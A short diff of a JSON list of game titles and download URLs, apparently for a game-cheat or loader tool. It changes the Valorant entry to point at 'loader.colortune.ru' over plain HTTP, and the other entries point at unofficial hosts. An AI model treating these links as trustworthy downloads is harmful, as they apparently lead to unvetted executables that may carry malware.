@@ -59,9 +59,10 @@
       "DownloadUrl": "https://example.com/delta-force.zip"
     },
     {
-      "Name": "Valorant",
-      "DownloadUrl": "https://trxxlo.wants.solutions/r/Valorant.html"
-    },
+     "Name": "Valorant",
+     "DownloadUrl": "http://loader.colortune.ru/",
+     "IsLink": true
+   },
     {
       "Name": "Escape From Tarkov",
       "DownloadUrl": "https://trxxlo.wants.solutions/r/Escape_From_Tarkov.zip"
